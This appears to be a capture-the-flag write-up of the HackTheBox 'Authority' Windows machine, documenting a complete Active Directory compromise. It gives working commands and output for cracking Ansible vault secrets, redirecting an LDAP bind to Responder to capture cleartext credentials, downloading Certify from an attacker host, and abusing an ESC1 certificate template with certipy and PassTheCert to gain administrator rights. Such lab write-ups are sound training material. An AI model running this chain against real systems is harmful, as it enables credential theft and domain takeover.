# HackTheBox — Authority

![OS: Windows](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: active-directory, ansible-vault, esc1, passthecert](https://img.shields.io/badge/Tags-Active%20Directory%20%7C%20Ansible%20Vault%20%7C%20ESC1%20%7C%20PassTheCert-orange)

> **TL;DR** — SMB share `Development` is anonymously readable; pull down an Ansible playbook tree that includes three vault-encrypted secrets. Crack the vault password with hashcat (`!@#$%^&*`) and decrypt to recover three credentials. Use the PWM admin password to download a misconfigured PWM config, point its LDAP target at our host, and pop a cleartext LDAP-bind credential via Responder. With those LDAP creds, evil-winrm in as `svc_ldap`. The CA has an **ESC1**-vulnerable certificate template (`CorpVPN`) — abuse it with `certipy` to request a cert as `administrator`, then **PassTheCert** via LDAP to add `svc_ldap` to `Administrators`. Re-connect, pop root.

---

## Attack Chain at a Glance

```
nmap → SMB Development share → Ansible playbook tree
   → 3 ANSIBLE_VAULT blocks → ansible2john + hashcat (rockyou) → !@#$%^&*
   → ansible-vault decrypt → svc_pwm / pWm_@dm!N_!23 / DevT3st@123
   → PWM @ :8443 admin login (pWm_@dm!N_!23) → download config
   → modify ldap URL to attacker:port + downgrade ldaps→ldap → upload
   → Responder catches LDAP cleartext bind: svc_ldap : lDaP_1n_th3_cle4r!
   → evil-winrm as svc_ldap → user.txt
   → Certify finds vulnerable template CorpVPN (ESC1: ENROLLEE_SUPPLIES_SUBJECT)
   → addcomputer.py creates gettinghacked1$ machine account
   → certipy req as gettinghacked1$ with -upn administrator@authority.htb
   → certipy cert split → user.key + user.crt
   → passthecert.py LDAP shell → add_user_to_group svc_ldap Administrators
   → reconnect evil-winrm → root.txt
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [SMB — Anonymous Development Share](#smb--anonymous-development-share)
- [Decrypting Ansible Vault Secrets](#decrypting-ansible-vault-secrets)
- [PWM Config → LDAP Capture via Responder](#pwm-config--ldap-capture-via-responder)
- [User Flag — evil-winrm as svc_ldap](#user-flag--evil-winrm-as-svc_ldap)
- [Privilege Escalation — ESC1 + PassTheCert](#privilege-escalation--esc1--passthecert)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.129.156.104
```

<details>
<summary>Click to expand</summary>

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
5985/tcp  open  http          (WinRM)
8443/tcp  open  ssl/https-alt (PWM at /pwm)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http
49664+/tcp open  msrpc        (multiple ephemeral RPC ports)

Service Info: Host: AUTHORITY; OS: Windows
```

</details>

The cert SAN tells us the domain is `authority.htb` (also `authority.htb.corp` / `htb.corp` / `HTB`).

| Port | Service | Notes |
|------|---------|-------|
| 80   | IIS 10  | Default page — dead end |
| 88, 389, 445, 636, … | AD/SMB/LDAP/Kerberos | Standard DC ports |
| 5985 | WinRM   | Will be the foothold once we have creds |
| 8443 | PWM     | Password self-service portal — `https://authority.htb.corp:8443/pwm/private/login` |

> 💡 **PWM** is an open-source password self-service tool. The login page exposes a configuration manager that will let us "modify configurations without authenticating" once we have the admin password.

---

## SMB — Anonymous Development Share

```bash
smbclient //10.129.158.146/Development
# Press Enter for password (anonymous)

smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

The share contains an **Ansible** playbook tree (`Automation/Ansible/...`).

Reference for the Ansible-on-Windows-pentest workflow: <https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible>

### `Automation/Ansible/PWM/defaults/main.yml`

Three vault-encrypted secrets:

```yaml
pwm_admin_login (svc_pwm): !vault |
  $ANSIBLE_VAULT;1.1;AES256
  32666534386435366537653136663731633138616264323230383566333966346662313161326239
  ...

pwm_admin_password (pWm_@dm!N_!23): !vault |
  $ANSIBLE_VAULT;1.1;AES256
  31356338343963323063373435363261323563393235633365356134616261666433393263373736
  ...

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password (DevT3st@123): !vault |
  $ANSIBLE_VAULT;1.1;AES256
  63303831303534303266356462373731393561313363313038376166336536666232626461653630
  ...
```

> 💡 The plaintext labels next to each variable name (e.g. `(svc_pwm)`) are *comments left in the YAML*, not the actual values — they're the human-readable name for what the vault entry is. The actual password is the AES256 blob.

---

## Decrypting Ansible Vault Secrets

Save each `$ANSIBLE_VAULT;1.1;AES256` block (header + ciphertext) into its own file (`vault1.txt`, `vault2.txt`, `vault3.txt`).

Convert to a hashcat-readable format and crack:

```bash
python3 /usr/share/john/ansible2john.py vault1.txt > vault1.in
hashcat -m 16900 -O -a 0 -w 4 --session=vault -o vault1.out vault1.in ~/rockyou.txt
```

Cracked vault password: **`!@#$%^&*`**

Decrypt each:

```bash
cat vault1.txt | ansible-vault decrypt   # → svc_pwm
cat vault2.txt | ansible-vault decrypt   # → pWm_@dm!N_!23
cat vault3.txt | ansible-vault decrypt   # → DevT3st@123
```

Three creds:

| Variable                       | Value             |
|--------------------------------|-------------------|
| `pwm_admin_login`              | `svc_pwm`         |
| `pwm_admin_password`           | `pWm_@dm!N_!23`   |
| `ldap_admin_password` (dev)    | `DevT3st@123`     |

---

## PWM Config → LDAP Capture via Responder

Log in to PWM at `https://authority.htb.corp:8443/pwm/private/login` using `pWm_@dm!N_!23`.

In the **Configuration Manager** (which PWM exposes without re-prompting for credentials in its default state):

1. Download the existing PWM configuration file.
2. Open it locally and find line ~75 — the LDAP server URL.
3. Change the LDAP URL to `ldap://<your-tun0-ip>:389/` (and **downgrade `ldaps` → `ldap`** so it sends cleartext).
4. Upload the modified config back through PWM.

Reference: <https://notsosecure.com/pwning-with-responder-a-pentesters-guide>

Catch the bind:

```bash
sudo responder -I tun0
```

When PWM next attempts an LDAP operation (or you trigger one — e.g. a "test connection" button), Responder logs the cleartext bind:

```
[LDAP] Cleartext Client   : 10.129.157.45
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

> 💡 **Why ldaps → ldap matters:** TLS-wrapped LDAP encrypts the bind; cleartext LDAP doesn't. By forcing PWM to use the unencrypted variant, the password lands on the wire in the clear, and Responder reads it from the network.

---

## User Flag — evil-winrm as svc_ldap

```bash
evil-winrm -i 10.129.158.146 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

```
*Evil-WinRM* PS C:\Users\svc_ldap> type Desktop\user.txt
```

🚩 **User flag captured.**

---

## Privilege Escalation — ESC1 + PassTheCert

Reference: [HackTricks — AD Certificate Services Domain Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

### Find Vulnerable Templates with Certify

Get [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) onto the box:

```powershell
Invoke-WebRequest -Uri http://10.10.14.153:8081/Certify.exe -OutFile certify.exe
./certify.exe find /vulnerable
```

<details>
<summary>Click to expand Certify output</summary>

```
[*] Listing info about the Enterprise CA 'AUTHORITY-CA'
    Enterprise CA Name : AUTHORITY-CA
    DNS Hostname       : authority.authority.htb

[!] Vulnerable Certificates Templates :

    CA Name                              : authority.authority.htb\AUTHORITY-CA
    Template Name                        : CorpVPN
    Schema Version                       : 2
    Validity Period                      : 20 years
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    pkiextendedkeyusage                  : Client Authentication, Document Signing, ...
    Permissions
      Enrollment Permissions
        Enrollment Rights : HTB\Domain Admins, HTB\Domain Computers, HTB\Enterprise Admins
```

</details>

This is **ESC1** — the `CorpVPN` template:
- Allows enrollment by `Domain Computers` (any machine account works).
- Sets `ENROLLEE_SUPPLIES_SUBJECT`, meaning *we* pick the cert's subject (e.g. `administrator@authority.htb`).
- Has `Client Authentication` EKU → the cert is usable for AD authentication.

### Create a Machine Account

`svc_ldap` has the default `MAQ` allowance to create machine accounts:

```bash
addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' \
    -computer-name 'gettinghacked1$' \
    -computer-pass 'Lime1Cucumber2Pepino3Limon4'
```

```
[*] Successfully added machine account gettinghacked1$ with password Lime1Cucumber2Pepino3Limon4.
```

### Request a Certificate as administrator

```bash
certipy req -u 'gettinghacked1$' -p 'Lime1Cucumber2Pepino3Limon4' \
    -ca 'AUTHORITY-CA' -target 'authority.htb' \
    -template 'CorpVPN' \
    -upn 'administrator@authority.htb' \
    -dns 'authority.authority.htb' \
    -dc-ip '10.129.158.146'
```

```
[*] Successfully requested certificate
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

### Split the PFX

```bash
certipy cert -pfx administrator_authority.pfx -nocert -out user.key
certipy cert -pfx administrator_authority.pfx -nokey  -out user.crt
```

### PassTheCert → LDAP shell

[PassTheCert](https://github.com/AlmondOffSec/PassTheCert) opens an authenticated LDAP session using the cert directly (handy when the box has Schannel disabled for Kerberos but still allows LDAPS auth via cert):

```bash
python3 passthecert.py -action ldap-shell \
    -crt user.crt -key user.key \
    -domain 'authority.htb' \
    -dc-ip '10.129.158.146'
```

```
# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK
```

### Reconnect

Disconnect and reconnect `evil-winrm`. `svc_ldap` is now in `Administrators`:

```
*Evil-WinRM* PS C:\Users\svc_ldap> net user svc_ldap
...
Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

---

## Root Flag

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **SMB anonymous shares are still common** in CTF and real engagements. Always run `smbclient -L //target` first, then try every share with empty creds before assuming you need to authenticate.
- **Ansible vault secrets crack with rockyou way more often than they should.** `ansible2john` + hashcat mode `16900` is the standard pipeline.
- **PWM's "modify config without auth" is by design** — once you have the configuration manager password (which is just an admin password by another name), the LDAP target is yours to redirect.
- **Forcing `ldaps` → `ldap`** is a generalizable trick for any LDAP-bound service whose config you can edit. The bind password lands in the clear on Responder.
- **ESC1 = `ENROLLEE_SUPPLIES_SUBJECT` + Client Authentication EKU + permissive enrollment.** Three boxes to tick and you have a "request a cert as anyone" primitive.
- **PassTheCert is the LDAP-side counterpart to Pass-the-Hash.** Whenever you have a cert that the DC trusts for auth, you can act as that principal in LDAP without ever knowing the password — and that means group-membership edits.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Initial port scan |
| [`smbclient`](https://www.samba.org/) | Anonymous SMB share enumeration |
| [`ansible2john`](https://github.com/openwall/john/blob/bleeding-jumbo/run/ansible2john.py) + [`hashcat`](https://hashcat.net/) | Cracking the Ansible Vault password (mode 16900) |
| [`ansible-vault`](https://docs.ansible.com/ansible/latest/cli/ansible-vault.html) | Decrypting the recovered vault blocks |
| [Responder](https://github.com/lgandx/Responder) | Catching the cleartext LDAP bind |
| [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) | Remote PowerShell as `svc_ldap` |
| [Certify](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) | Finding vulnerable AD CS templates (ESC1) |
| [`certipy`](https://github.com/ly4k/Certipy) | Cross-platform AD CS cert request + PFX manipulation |
| [`addcomputer.py` (Impacket)](https://github.com/fortra/impacket) | Adding the rogue machine account |
| [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) | LDAP authentication via cert |
| [HackTricks — AD Certificate Domain Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) | ESC1-ESC11 reference |
